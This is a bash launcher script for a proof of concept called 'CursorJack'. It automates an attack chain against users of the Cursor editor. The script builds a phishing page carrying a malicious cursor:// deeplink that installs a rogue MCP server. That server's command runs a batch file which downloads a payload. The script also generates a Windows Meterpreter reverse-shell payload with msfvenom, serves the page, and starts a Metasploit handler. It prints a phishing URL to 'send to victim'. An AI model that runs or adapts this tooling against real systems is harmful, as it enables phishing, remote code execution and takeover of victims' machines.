#!/bin/bash
# ╔════════════════════════════════════════════════════════════════════╗
# ║  launch_poc.sh — One-click CursorJack PoC (Meterpreter)            ║
# ║  Detects IP, configures, builds payload, and launches services     ║
# ╚════════════════════════════════════════════════════════════════════╝

set -e

# ─── Stop Mode ─────────────────────────────────────────────────────
if [[ "${1:-}" == "--stop" || "${1:-}" == "stop" ]]; then
    echo ""
    echo -e "\033[0;36m[*]\033[0m Checking for running CursorJack services..."
    FOUND=0

    # Kill tmux session
    if tmux has-session -t cursorjack 2>/dev/null; then
        tmux kill-session -t cursorjack
        echo -e "  \033[0;32m[✔]\033[0m tmux session 'cursorjack' killed"
        FOUND=1
    else
        echo -e "  \033[2m[–]\033[0m tmux session 'cursorjack' not running"
    fi

    # Kill any lingering processes on the demo ports
    for PORT in 8000 4444; do
        PIDS=$(lsof -ti :$PORT 2>/dev/null || true)
        if [ -n "$PIDS" ]; then
            echo "$PIDS" | xargs kill 2>/dev/null || true
            echo -e "  \033[0;32m[✔]\033[0m Killed process(es) on port $PORT"
            FOUND=1
        else
            echo -e "  \033[2m[–]\033[0m No process on port $PORT"
        fi
    done

    echo ""
    if [ "$FOUND" -eq 1 ]; then
        echo -e "  \033[0;32m[✔]\033[0m All services stopped"
    else
        echo -e "  \033[0;36m[*]\033[0m No services were running"
    fi
    echo ""
    exit 0
fi

# ─── Colors ───────────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

step()  { echo -e "  ${GREEN}[✔]${NC} $1"; }
info()  { echo -e "  ${CYAN}[*]${NC} $1"; }
warn()  { echo -e "  ${YELLOW}[!]${NC} $1"; }
fail()  { echo -e "  ${RED}[✘]${NC} $1"; exit 1; }
line()  { echo -e "  ${DIM}────────────────────────────────────────────────────${NC}"; }

pause() {
    echo ""
    local secs=20
    while [ $secs -gt 0 ]; do
        printf "\r  ${DIM}Press Enter to continue... (%2ds)${NC}" $secs
        if read -r -t 1 -n 1 2>/dev/null; then break; fi
        secs=$((secs - 1))
    done
    printf "\r%-60s\r" " "
}

# ─── Project Root ─────────────────────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# ─── Banner ───────────────────────────────────────────────────────────
echo ""
echo -e "${CYAN}"
echo "   ██████╗██╗   ██╗██████╗ ███████╗ ██████╗ ██████╗      ██╗ █████╗  ██████╗██╗  ██╗"
echo "  ██╔════╝██║   ██║██╔══██╗██╔════╝██╔═══██╗██╔══██╗     ██║██╔══██╗██╔════╝██║ ██╔╝"
echo "  ██║     ██║   ██║██████╔╝███████╗██║   ██║██████╔╝     ██║███████║██║     █████╔╝ "
echo "  ██║     ██║   ██║██╔══██╗╚════██║██║   ██║██╔══██╗██   ██║██╔══██║██║     ██╔═██╗ "
echo "  ╚██████╗╚██████╔╝██║  ██║███████║╚██████╔╝██║  ██║╚█████╔╝██║  ██║╚██████╗██║  ██╗"
echo "   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝"
echo -e "${NC}"
echo -e "  ${BOLD}Meterpreter Reverse Shell Demo${NC}"
echo ""
echo -e "  ${DIM}Malicious link → victim clicks → Cursor installs rogue MCP → reverse shell${NC}"
echo ""
echo -e "  ${BOLD}This script will:${NC}"
echo -e "    1. Configure attacker infrastructure"
echo -e "    2. Build phishing page with deeplink"
echo -e "    3. Generate Meterpreter payload"
echo -e "    4. Serve phishing page and launch Metasploit handler"
echo ""
line
pause

# ─── Fixed Config ─────────────────────────────────────────────────────
HTTP_PORT=8000
LPORT=4444
MODE="metasploit-poc"

# ─── Port Conflict Check ──────────────────────────────────────
for PORT in $HTTP_PORT $LPORT; do
    if lsof -ti :$PORT &>/dev/null; then
        fail "Port $PORT is already in use. Run './launch_poc.sh --stop' or free the port."
    fi
done

# ─── Clean Build Directory ────────────────────────────────────
rm -rf "$SCRIPT_DIR/build"

# ═══════════════════════════════════════════════════════════════════════
#  Step 1 — Detect Attacker IP
# ═══════════════════════════════════════════════════════════════════════
echo ""
echo -e "  ${BOLD}Step 1/4 — Detect Attacker IP${NC}"
info "Detecting this machine's network IP..."

ATTACKER_IP=""

# Linux
if command -v ip &>/dev/null; then
    ATTACKER_IP=$(ip route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}' | head -1)
fi

# macOS fallback
if [ -z "$ATTACKER_IP" ] && command -v ipconfig &>/dev/null; then
    ATTACKER_IP=$(ipconfig getifaddr en0 2>/dev/null)
fi

# Generic fallback
if [ -z "$ATTACKER_IP" ]; then
    ATTACKER_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
fi

if [ -z "$ATTACKER_IP" ]; then
    fail "Could not detect local IP. Please set ATTACKER_IP in config.env manually."
fi

step "Attacker IP: ${BOLD}${ATTACKER_IP}${NC}"
pause

# ═══════════════════════════════════════════════════════════════════════
#  Step 2 — Write config.env
# ═══════════════════════════════════════════════════════════════════════
echo ""
echo -e "  ${BOLD}Step 2/4 — Configure Environment${NC}"
info "Writing config.env with PoC settings..."

cat > config.env << EOF
# CursorJack Configuration

ATTACKER_IP=$ATTACKER_IP
HTTP_PORT=$HTTP_PORT
LPORT=$LPORT

# Mode: metasploit-poc or custom
# metasploit-poc = Meterpreter reverse shell (auto-generates deeplink)
# custom = Use your own deeplink (set CURSOR_LINK below)
MODE=$MODE

# Only used if MODE=custom (must be in quotes)
CURSOR_LINK=""
EOF

step "config.env written"
echo ""
_bw=62
_box() {
    local raw
    raw=$(echo -e "$1" | sed $'s/\033\\[[0-9;]*m//g')
    local pad=$((_bw - ${#raw}))
    [ $pad -lt 0 ] && pad=0
    echo -e "  ${DIM}│${NC}$1$(printf '%*s' $pad '')${DIM}│${NC}"
}
echo -e "  ${DIM}┌$(printf '%0.s─' $(seq 1 $_bw))┐${NC}"
_box "  ${BOLD}ATTACKER_IP${NC}  $ATTACKER_IP"
_box "  ${BOLD}HTTP_PORT${NC}    $HTTP_PORT     ${DIM}web server hosting phishing page${NC}"
_box "  ${BOLD}LPORT${NC}        $LPORT     ${DIM}port for Meterpreter reverse shell${NC}"
_box "  ${BOLD}MODE${NC}         $MODE  ${DIM}Metasploit payload${NC}"
echo -e "  ${DIM}└$(printf '%0.s─' $(seq 1 $_bw))┘${NC}"
pause

# ═══════════════════════════════════════════════════════════════════════
#  Step 3 — Build Phishing Page & Deeplink
# ═══════════════════════════════════════════════════════════════════════
line
echo ""
echo -e "  ${BOLD}Step 3/4 — Build Phishing Page & Deeplink${NC}"
info "Copying HTML templates, injecting attacker IP/ports,"
info "and generating the malicious cursor:// deeplink."
echo ""

# Build phishing page using Python script
python3 resources/build_phishing_page.py > /dev/null

step "Phishing page built with embedded deeplink"
info "When the victim opens the phishing page, the browser triggers a cursor:// deeplink."
info "Cursor then prompts the user to install the attacker's MCP server."
echo ""

# Extract and display the generated deeplink
DEEPLINK=$(python3 resources/create_deeplink.py build/mcp.json 2>/dev/null || true)
if [ -n "$DEEPLINK" ]; then
    info "Generated malicious deeplink:"
    echo "$DEEPLINK" | fold -w 70 | while IFS= read -r dl_line; do
        echo -e "    ${YELLOW}${dl_line}${NC}"
    done
    echo ""
    info "Deeplink installs MCP whose command runs ${BOLD}run.bat${NC} → fetches ${BOLD}payload.exe${NC}"
fi
echo ""

# Show the MCP JSON payload (the actual malicious command)
if [ -f build/mcp.json ]; then
    info "MCP server config ${DIM}(build/mcp.json)${NC}:"
    while IFS= read -r json_line; do
        echo -e "    ${RED}${json_line}${NC}"
    done < build/mcp.json
fi

# Show run.bat contents (what the MCP command downloads and executes)
if [ -f build/webserver/payload/run.bat ]; then
    echo ""
    info "run.bat ${DIM}(downloaded & executed on victim)${NC}:"
    while IFS= read -r bat_line; do
        echo -e "    ${RED}${bat_line}${NC}"
    done < build/webserver/payload/run.bat
fi
pause

# ═══════════════════════════════════════════════════════════════════════
#  Step 4 — Build Meterpreter Payload
# ═══════════════════════════════════════════════════════════════════════
line
echo ""
echo -e "  ${BOLD}Step 4/4 — Generate Meterpreter Payload${NC}"
info "Building a Windows x64 stageless reverse-TCP Meterpreter payload."
echo ""

if ! command -v msfvenom &>/dev/null; then
    fail "msfvenom not found. Install Metasploit Framework first."
fi

info "Running: ${BOLD}msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ATTACKER_IP} LPORT=${LPORT} -f exe -o payload.exe${NC}"

msfvenom -p windows/x64/meterpreter_reverse_tcp \
    LHOST="$ATTACKER_IP" LPORT="$LPORT" \
    -f exe -o build/webserver/payload/payload.exe \
    2>&1 | tail -1

PAYLOAD_SIZE=$(ls -lh build/webserver/payload/payload.exe 2>/dev/null | awk '{print $5}')
echo ""
step "Payload ready → build/webserver/payload/payload.exe (${PAYLOAD_SIZE:-unknown})"
pause

# ═══════════════════════════════════════════════════════════════════════
#  Launch Services
# ═══════════════════════════════════════════════════════════════════════
line
echo ""
echo -e "  ${GREEN}✓${NC}  ${BOLD}Build complete — launching services${NC}"
echo ""
echo -e "  ${CYAN}Phishing URL (send to victim):${NC}"
echo -e "  ${BOLD}http://${ATTACKER_IP}:${HTTP_PORT}/index.html${NC}"
echo ""

# ─── tmux: split-pane with HTTP server + msfconsole ──────────────────
if command -v tmux &>/dev/null; then
    info "Launching two services in a tmux split-screen:"
    echo -e "    ${DIM}Top pane:${NC}     HTTP server on port ${BOLD}${HTTP_PORT}${NC}  — serves phishing page & payload"
    echo -e "    ${DIM}Bottom pane:${NC}  Metasploit handler on port ${BOLD}${LPORT}${NC}  — catches the reverse shell"
    echo ""
    echo -e "  ${DIM}tmux controls:  Ctrl-B ↑/↓ = switch panes  |  Ctrl-B D = detach${NC}"
    echo ""

    SESSION="cursorjack"
    tmux kill-session -t "$SESSION" 2>/dev/null || true

    # Top pane — HTTP server (suppress connection errors)
    tmux new-session -d -s "$SESSION" -c "$SCRIPT_DIR/build/webserver" \
        "printf '\n  \033[0;32m[HTTP Server]\033[0m Serving phishing page + payload on port $HTTP_PORT\n  Victim URL: \033[1;33mhttp://$ATTACKER_IP:$HTTP_PORT/index.html\033[0m\n  Waiting for victim to connect...\n\n'; python3 -m http.server $HTTP_PORT 2>&1 | grep -vE 'BrokenPipeError|ConnectionResetError|sendall'"

    # Bottom pane — msfconsole handler with bell on session
    MSF_LOG="/tmp/cursorjack_msf_$$.log"
    
    tmux split-window -v -t "$SESSION" \
        "rm -f $MSF_LOG; (while ! grep -q 'session.*opened' $MSF_LOG 2>/dev/null; do sleep 1; done; printf '\a\a\a'; echo ''; echo '  \033[1;32m>>> METERPRETER SESSION OPENED <<<\033[0m'; echo '  \033[2mTry: getuid, sysinfo, shell (help for all commands)\033[0m'; echo '') & printf '\n  \033[0;32m[Metasploit Handler]\033[0m Listening on $ATTACKER_IP:$LPORT\n  Waiting for victim...\n\n'; msfconsole -q -x 'spool $MSF_LOG; use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST $ATTACKER_IP; set LPORT $LPORT; run'"

    # Even split
    tmux select-layout -t "$SESSION" even-vertical

    # Colored pane border labels
    tmux set-option -t "$SESSION" pane-border-status top
    tmux set-option -t "$SESSION" pane-border-format \
        '#[bold] #{?#{==:#{pane_index},0},#[fg=green] HTTP Server (port '$HTTP_PORT') ,#[fg=red] Meterpreter (port '$LPORT') } #[default]'
    tmux set-option -t "$SESSION" pane-border-style 'fg=colour240'
    tmux set-option -t "$SESSION" pane-active-border-style 'fg=colour51'

    # Attach
    tmux attach-session -t "$SESSION"

else
    # ─── Fallback: no tmux ────────────────────────────────────────────
    warn "tmux not found — starting HTTP server in background, msfconsole in foreground"
    echo ""

    cd "$SCRIPT_DIR/build/webserver"
    python3 -m http.server "$HTTP_PORT" &
    HTTP_PID=$!

    # Trap to kill HTTP server on exit
    trap "kill $HTTP_PID 2>/dev/null" EXIT

    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST $ATTACKER_IP; set LPORT $LPORT; run"
fi
